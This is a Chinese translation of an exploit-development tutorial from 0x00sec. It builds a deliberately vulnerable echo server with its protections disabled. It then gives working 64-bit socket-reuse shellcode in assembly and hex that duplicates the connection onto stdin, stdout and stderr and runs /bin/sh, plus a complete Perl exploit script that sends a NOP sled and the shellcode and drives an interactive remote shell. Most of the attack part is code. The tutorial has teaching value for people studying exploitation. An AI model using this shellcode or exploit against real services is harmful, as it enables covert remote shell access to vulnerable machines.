> 原文链接: https://www.anquanke.com//post/id/85306 


# 【技术分享】远程漏洞利用：无需借助套接字的Shellcode


                                阅读量   
                                **103426**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：0x00sec.org
                                <br>原文地址：[https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440](https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p4.ssl.qhimg.com/t016d09957f1e7bcf5b.jpg)](https://p4.ssl.qhimg.com/t016d09957f1e7bcf5b.jpg)**

****

**翻译：**[**shan66******](http://bobao.360.cn/member/contribute?uid=2522399780)

**预估稿费：200RMB（不服你也来投稿啊！）**

**<strong><strong>投稿方式：发送邮件至**[**linwei#360.cn**](mailto:linwei@360.cn)**，或登陆**[**网页版**](http://bobao.360.cn/contribute/index)**在线投稿**</strong></strong>

**<br>**

**前言**

在本文中，我将介绍一种优雅的技术，来获得一个shell访问易受攻击的远程机器。虽然这个技术不是我发明的，但我发现它的确很有趣，所以本文的重点是这种技术本身，而不是利用漏洞的具体方式。

<br>

**设置环境**

为了专注于远程shell代码本身，而不是把精力用在如何规避ASLR、非可执行堆栈等防御措施上面，我们将禁用这些安全功能。一旦熟悉了获取shellcode的方法，可以重新启用这些保护措施，以进一步练习如何突破这些安全设置。因此，这是一个非常有趣的练习，如果你想练手的话。

首先，我们将禁用ASLR。为此，可以使用以下命令：

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

这些设置都是临时性质的，在下次重新启动时会全部还原。如果你想要在不重新启动机器的情况下立即还原所有设置的话，可以使用如下所示的命令：

```
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

为了禁用其余的安全功能，我们可以使用以下选项来编译带有安全漏洞的服务器：

```
-fno-stack-protector -z execstack
```

这些选项会禁用堆栈的canarie保护，并赋予堆栈执行权限。这样的话，我们就得到了一个非常容易利用的环境。

<br>

**带有安全漏洞的服务**

现在，让我们编写一个带有缓冲区溢出漏洞的小型回显服务器，这样我们就可以远程利用它了。这个程序很简单，你能发现代码中的缓冲区溢出漏洞吗？ 你当然可以。

```
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
 
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
 
int
process_request (int s1, char *reply)
`{`
  char result[256];
 
  strcpy (result, reply);
  write (s1, result, strlen(result));
  printf ("Result: %pn", &amp;result);
  return 0;
`}`
 
int
main (int argc, char *argv[])
`{`
  struct sockaddr_in   server, client;
  socklen_t            len = sizeof (struct sockaddr_in);
  int                  s,s1, ops = 1;
  char                 reply[1024];
 
  server.sin_addr.s_addr = INADDR_ANY;
  server.sin_family = AF_INET;
  server.sin_port = htons(9000);
 
  s = socket (PF_INET, SOCK_STREAM, 0);
  if ((setsockopt (s, SOL_SOCKET, SO_REUSEADDR, &amp;ops, sizeof(ops))) &lt; 0)
    perror ("pb_server (reuseaddr):");
  bind (s, (struct sockaddr *) &amp;server, sizeof (server));
  listen (s, 10);
 
  while (1)
    `{`
      s1 = accept (s, (struct sockaddr *)&amp;client, &amp;len);
      printf ("Connection from %sn", inet_ntoa (client.sin_addr));
      memset (reply, 0, 1024);
      read (s1, reply, 1024);
      process_request (s1, reply);
      close (s1);
    `}`
  return 0;
`}`
```

很好，下面我们就来编译它，让它变成一个最容易利用的服务器：

```
gcc -g -fno-stack-protector -z execstack -o target target.c
```

下面，我们来展示它的脆弱性。在一个终端运行这个带有安全漏洞的服务器，然后在另一个终端运行下列命令：

```
$ perl -e 'print "A"x1024;' | nc localhost 9000
```

在运行服务器的终端中，我们将会看到如下所示的内容：

```
$  ./target
Connection from 127.0.0.1
Result: 0x7fffffffdbf0
Segmentation fault (core dumped)
```

注意，我已经添加了打印局部变量的地址的语句，从而可以验证ASLR是否被禁用。每次执行这个二进制代码的时候，应该总是看到相同的数字（当然，如果你修改了这个程序，数字就会随之改变）。

现在，我们可以拿这个程序来练手，学习如何使用各种触手可及的shellcode来获取一个本地shell。尽管这个练习非常简单，但是我们建议您至少要练习一次。具体过程本文不作详细介绍，因为关于缓冲区溢出漏洞利用的教程，在网络上面数不胜数。

<br>

**远程Shell**

下面我们介绍如何获取远程shell。注意，这里的关键在于“远程”。这意味着在易受攻击的机器和攻击者之间，隔着一个网络。或者换句话说，我们必须通过一些套接字来发送/接收数据。根据这一要求，有两种方式可以用来获得远程shell：

如果你的shellcode创建一个服务器套接字来启用来自外部的连接请求，并从本地shell发送和接收数据 …那么，这就是一个直接远程shell。

如果你的shellcode连接回一个预先指定的主机，并且这个主机上运行的服务器软件正在等待受害者的连接…那么，这就这是一个反向远程shell。

关于这两种远程shell的详细信息，请访问[https://0x00sec.org/t/remote-shells-part-i/269](https://0x00sec.org/t/remote-shells-part-i/269)。

看到这两个定义后，你可能会联想到RHOST/RPORT之类的变量….是的，它们可以用来告诉payload连接的主机地址和相应的端口。对于反向shell来说，您必须将这些信息存放到payload中，以便连接回来。对于直接shell你通常需要定义端口，服务器就会等待连接。

但是，至少对于Unix机器来说，还有第三种选择。

<br>

**连接复用**

当执行远程漏洞利用代码时，为了利用此漏洞，您已经连接到了服务器…所以，为什么不重用这个已经建立好的连接呢？这真是一个不错的想法，因为它不会显示任何会引起受害者怀疑的东西，例如来自服务器未知服务的开放端口等。

实现这一点的方法也非常巧妙。它是基于这样的事实，即系统是按顺序分配文件描述符的。知道了这一点，我们就可以在建立连接之后立即复制一个当前文件的描述符，除非服务器的负载很重，否则我们得到的文件描述符等于用于我们连接的套接字的文件描述符+1，这样很容易就能知道我们的连接的文件描述符了。

一旦知道了当前连接的文件描述符，我们只需要将它复制到文件描述符0、1和2（stdin、stdout和stderr），就可以生成一个shell了。这样一来，该shell的所有输入/输出都会被重定向到我们的套接字了。

还不明白吗？肯定没读过[https://0x00sec.org/t/remote-shells-part-i/269](https://0x00sec.org/t/remote-shells-part-i/269)页面上的文章吧？不过没关系，现在去看也不晚。

相应的C代码如下所示：

```
int sck = dup (0) - 1; // Duplicate stdin
dup2 (sck, 0);
dup2 (sck, 1);
dup2  (sck, 2);
execv ("/bin/sh", NULL);
```

看…根本就没有使用套接字代码！如果我们把它变成一个shellcode，并且设法利用远程服务器的漏洞来运行该代码，我们就能够获得一个shell来访问远程机器，而这个shell所使用的连接，正好就是原来向远程服务器投递利用代码的那个连接。

当然，也你已经注意到这种技术存在一些缺点。就像我们所提到的那样，如果服务器比较繁忙的话（同时建立许多连接），这种方法就很难奏效了。此外，正常的服务器会在变成守护进程之前关闭所有的文件描述符，因此我们可能需要尝试使用其他值来推测文件描述符。

这个技术是前一段时间跟@_py进行讨论的时候，由他想出来的。我们当时检查的原始代码可以在这里找到：

```
http://shell-storm.org/shellcode/files/shellcode-881.php4
```

但是，这是一个32位代码，所以我重新制作了对应的64位版本，以及一个运行漏洞利用代码的Perl脚本。

<br>

**64位版本的Shellcode**

下面的代码您就将就着看吧(我这才发现自己的汇编技能真是生锈了)，不过它确实可以正常运行，并且只比原来的32bits版本长了3个字节。我的64位版本的Shellcode如下所示：

```
section .text
global _start
_start:
         ;; s = Dup (0) - 1
         xor rax, rax
         push rax
         push rax
         push rax
         pop rsi
         pop rdx
         push rax
         pop rdi
         mov al, 32
         syscall                  ; DUP (rax=32) rdi = 0 (dup (0))
 
         dec rax
         push rax
         pop rdi            ; mov rdi, rax  ; dec rdi
 
         ;; dup2 (s, 0); dup2(s,1); dup2(s,2)
loop:        mov al, 33
         syscall                       ; DUP2 (rax=33) rdi=oldfd (socket) rsi=newfd
         inc rsi
         mov rax,rsi
         cmp al, 2          ; Loop 0,1,2 (stdin, stdout, stderr)
         
         jne loop
 
         ;; exec (/bin/sh)
         push    rdx                             ; NULL
         mov qword rdi, 0x68732f6e69622f2f    ; "//bin/sh"
         push         rdi                              ; command
         push        rsp                     
         pop         rdi                      
         
         push        rdx            ;env
         pop         rsi             ;args
         
        mov     al, 0x3b ;EXEC (rax=0x4b) rdi="/bin/sh" rsi=rdx=
        syscall
```

对于不太容易理解的地方，我已经添加了相应的注释。同时，你可能也注意到了，代码里使用了许多的push/pop指令，这是因为一个PUSH/POP指令对占用2个字节，而MOV R1，R2指令则需要占用3个字节。虽然这会代码变得非常丑，但是却能节约一些空间…实际上也没有节约太多的地方，所以也算不上一个好主意。无论如何，您可以随意改进它，并欢迎在评论中发布您自己的版本。

<br>

**生成Shellcode**

现在，我们需要生成相应的shellcode，同时，其格式必须适合将其发送到远程服务器才行。为此，我们首先需要编译代码，然后从编译的文件中提取机器代码。编译代码非常简单，具体如下所示：

```
nasm -f elf64 -o rsh.o rsh.asm
```

当然，从目标文件中获取二进制数据的方法有很多。我们这里使用的方法是生成具有易于添加到Perl或C程序中的格式的字符串。

```
for i in $(objdump -d rsh.o -M intel |grep "^ " |cut -f2); do echo -n 'x'$i; done;echo
```

上面的两个命令将产生以下shellcode：

```
x48x31xc0x50x50x50x5ex5ax50x5fxb0x20x0fx05x48xffxc8x50x5fxb0x21x0fx05x48xffxc6x48x89xf0x3cx02x75xf2x52x48xbfx2fx2fx62x69x6ex2fx73x68x57x54x5fx52x5exb0x3bx0fx05
```

接下来，我们就需要开始编写漏洞利用代码了。

<br>

**漏洞利用代码**

目前为止，我们已经搭设了一个带有远程利用漏洞的系统。同时，也了解了如何在低安全环境中利用缓冲区溢出漏洞，并生成了一个用于在远程系统上运行的shellcode。现在我们需要一个漏洞利用代码，把所有这些整合起来，从而获得我们梦寐以求的远程shell。

当然，编写漏洞利用代码的语言有很多，不过这里选用的是自己最熟悉的Perl。

我们的漏洞利用代码具体如下所示：

```
#!/usr/bin/perl
use IO::Select;
use IO::Socket::INET;
$|=1;
 
print "Remote Exploit Example";
print "by 0x00pf for 0x00sec :)nn";
 
# You may need to calculate these magic numbers for your system
$addr = "x10xddxffxffxffx7fx00x00"; 
$off = 264;
 
# Generate the payload
$shellcode = "x48x31xc0x50x50x50x5ex5ax50x5fxb0x20x0fx05x48xffxc8x50x5fxb0x21x0fx05x48xffxc6x48x89xf0x3cx02x75xf2x52x48xbfx2fx2fx62x69x6ex2fx73x68x57x54x5fx52x5exb0x3bx0fx05";
 
$nops = $off - length $shellcode;
$payload = "x90" x $nops . $shellcode . $addr;
 
$plen = length $payload;
$slen = length $shellcode;
print "SLED $nops Shellcode: $slen Payload size: $plenn";
 
# Connect
my $socket = new IO::Socket::INET (
    PeerHost =&gt; '127.0.0.1',
    PeerPort =&gt; '9000',
    Proto =&gt; 'tcp',
    );
# Set up select for asynchronous read from the server
$sel = IO::Select-&gt;new( $socket );
$sel-&gt;add(*STDIN);
 
# Exploit!
$socket-&gt;send ($payload);
$socket-&gt;recv ($trash,1024);
$timeout = .1;
 
$flag = 1; # Just to show a prompt
 
# Interact!
while (1) `{`
    if (@ready = $sel-&gt;can_read ($timeout))  `{`
         foreach $fh (@ready) `{`
             $flag =1;
             if($fh == $socket) `{`
                  $socket-&gt;recv ($resp, 1024);
                  print $resp;
             `}`
             else `{` # It is stdin
                  $line = &lt;STDIN&gt;;
                  $socket-&gt;send ($line);
             `}`
         `}`
    `}`       
    else `{` # Show the prompt whenever everything's been read
         print "0x00pf]&gt;  " if ($flag);
         $flag = 0;
    `}`       
`}`
```

漏洞利用代码的开头部分几乎是标准式的。接下来，根据您利用gdb找出的魔法数字来生成payload（请注意，在您的系统中这些数字可能会有所不同，这样的话，这个漏洞利用代码，在您的系统中，可能就会无法正常工作）。

然后，我们必须针对自己的远程shell进行一些额外的工作。使用直接和反向shell时，一旦漏洞利用代码执行完毕，我们通常需要使用另一个程序/模块连接到远程机器，或接收来自远程机器的连接。为此，可以使用netcat或您喜欢的渗透测试平台，甚至是自己专门编写的工具…

但是，就本地而言，我们将使用已建立的连接来访问shell，这个连接就是之前用来发送payload的那个。所以我添加了一些代码，用来从stdin读取命令，并将它们发送到远程服务器，同时也从远程shell读取数据。这些都是些标准的网络代码，实在是没有什么特别之处。

现在，你可以尝试一下这个可以获取远程shell的漏洞利用代码了！

<br>

**小结**

在本文中，我们讨论了一种巧妙地技术，可以隐秘地获取shell来远程访问易受攻击的服务器，并且不需要跟系统提供的套接字API打交道。这使得shellcode的开发变得更简单，也使其更简洁（例如，你可以跟[http://shell-storm.org/shellcode/files/shellcode-858.php2](http://shell-storm.org/shellcode/files/shellcode-858.php2)提供的代码比较一番。

欢迎各位改进这个shellcode，并在评论中发布自己的版本。此外，如果有人想尝试在安全功能被激活情况下的漏洞利用的话，可以：

重新激活ASLR（你已经知道如何做了）

禁用堆栈的执行权限（删除-zexecstack标志或使用execstack工具）

重新激活堆栈保护功能（删除-fno-stackprotector标志）

使用更专业的安全编译选项（使用-DFORTIFY_SOURCE = 2选项进行编译，或使用-O2选项）

使用更加严酷的安全编译选项（使用-O2 -fPIC -pie -fstack-protector-all -Wl，-z，relro，-z，now进行编译）
